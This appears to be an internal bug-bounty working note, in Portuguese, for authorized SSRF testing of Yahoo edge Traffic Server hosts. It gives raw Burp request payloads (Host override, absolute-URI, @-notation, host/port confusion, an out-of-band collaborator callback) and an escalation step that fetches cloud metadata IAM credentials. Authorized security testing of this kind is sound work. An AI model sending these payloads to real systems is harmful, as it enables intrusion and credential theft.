---
program_id: yahoo
document_type: note
claimed_scope_status: unknown
classification: internal
source: intigriti policy (yahoo) — 2026-09-08
collected_at: 2026-09-12T00:00:00Z
tags: [root, yahoo]
asset_refs: [apis.mail.yahoo.com]
---
# L7 — Kit de payloads pro Burp (routing-based SSRF no edge ATS Yahoo)

**Objetivo:** provar que um edge ATS alcançável **roteia por Host/URL do cliente** pra um destino interno arbitrário → SSRF (CWE-918).
**Prova aceita e paga:** ler um arquivo do **bananastand** (testbed oficial da Yahoo) OU um callback OOB.
**Header obrigatório em TODOS os requests:** `X-Bug-Bounty: Intigriti-moldret`
**Guardrails:** ≤50 req/s (na real, **1 de cada vez** — `finance` já deu 429); NUNCA pivotar/exfiltrar; PoC mínima; anexos só no report.

---

## Setup no Burp
1. Repeater. Desligue "Update Content-Length" só nos testes de request-line se precisar.
2. **Proxy → Options → Match&Replace** (ou a aba do Repeater): adicione o header `X-Bug-Bounty: Intigriti-moldret` em todo request.
3. Alvo (edge alcançável e menos throttled): comece por **`apis.mail.yahoo.com`**, `data.mail.yahoo.com`, `onepush.query.yahoo.com`, `proddata.xobni.yahoo.com`, `s.yimg.com`. Evite `finance` (429).
4. **Sinal de sucesso do bananastand:** resposta HTML `...404 no bananas for you!...` = você ALCANÇOU um host bananastand (mesmo sem o arquivo certo) = **roteamento interno provado**. Ler `txt_001.txt` = prova completa.

Bananastand prod (escolha um): `banana.stand.gq1.yahoo.com` · `banana.stand.bf1.yahoo.com` · `banana.stand.ne1.yahoo.com`
Arquivo alvo: `/txt_001.txt` (ou `/noext_01`). Marcador de log (peça deles): `/intigriti-moldret`

---

## A — Baseline (control, pra ter com o que comparar)
```
GET /txt_001.txt HTTP/1.1
Host: apis.mail.yahoo.com
X-Bug-Bounty: Intigriti-moldret
Connection: close
```
Esperado: 404/normal do próprio host. (Se JÁ vier "no bananas", o edge é MUITO permissivo.)

## B — Host header override (o mais simples)
```
GET /txt_001.txt HTTP/1.1
Host: banana.stand.gq1.yahoo.com
X-Bug-Bounty: Intigriti-moldret
Connection: close
```
→ mande pro IP/conexão de um edge alcançável (aponte o Repeater pra `apis.mail.yahoo.com:443` mas troque o Host). Se vier o conteúdo do arquivo OU "no bananas for you!" = **edge roteou pelo Host pra host interno**. 🎯

## C — Absolute-URI na request line (vence o Host em alguns backends)
```
GET http://banana.stand.gq1.yahoo.com/txt_001.txt HTTP/1.1
Host: apis.mail.yahoo.com
X-Bug-Bounty: Intigriti-moldret
Connection: close
```

## D — @-notation (parser vira http://legit@destino/)
```
GET @banana.stand.gq1.yahoo.com/txt_001.txt HTTP/1.1
Host: apis.mail.yahoo.com
X-Bug-Bounty: Intigriti-moldret
Connection: close
```

## E — Ambiguidade porta/host (edge parseia diferente do backend)
```
GET /txt_001.txt HTTP/1.1
Host: apis.mail.yahoo.com:80@banana.stand.gq1.yahoo.com
X-Bug-Bounty: Intigriti-moldret
Connection: close
```

## F — Marcador de log (rode junto do que "pegar", pra eles acharem no log)
Troque o path por `/intigriti-moldret` na variante que funcionou (B/C/D/E). Anote timestamp + host.

## G — OOB (SÓ se você tiver Collaborator) — pega roteamento cego
```
GET / HTTP/1.1
Host: <SEU-ID>.oastify.com
X-Bug-Bounty: Intigriti-moldret
Connection: close
```
e a variante absolute-URI: `GET http://<SEU-ID>.oastify.com/ HTTP/1.1` + `Host: apis.mail.yahoo.com`. Ping DNS/HTTP no Collaborator = SSRF cego confirmado.

---

## O que anotar por payload (me cola isto)
- Payload (B/C/D/E/G) · host-edge usado · **status** · **primeiros bytes do corpo** (procuro "no bananas for you!" ou conteúdo de `txt_001.txt`) · headers `Server`/`Via`/`X-Cache`/qualquer banner interno · **latência** (rápido demais = roteou local).
- Se pegar: repita com `/intigriti-moldret` + salve **timestamp**, **host bananastand**, **IP**.

## Escalada (se B–E derem SSRF)
1. Trocar destino por `http://169.254.169.254/latest/meta-data/` → credencial IAM (metadata cloud).
2. Falar o protocolo do ATS ("Traffic Server Overseer"): mandar `HELP`, depois `GET proxy.config.*` — foi o que rendeu $20k×2 no "Cracking the Lens".
(Ambas via lança — me manda a resposta do passo 1 antes de ir pro 2.)

## Escopo/report
Edge + bananastand = ambos in-scope Yahoo. Report exige: arquivo baixado (anexo), timestamp, host bananastand, IP, request+response. CVSS provável **High–Critical** (CWE-918: SSRF interno na infra).
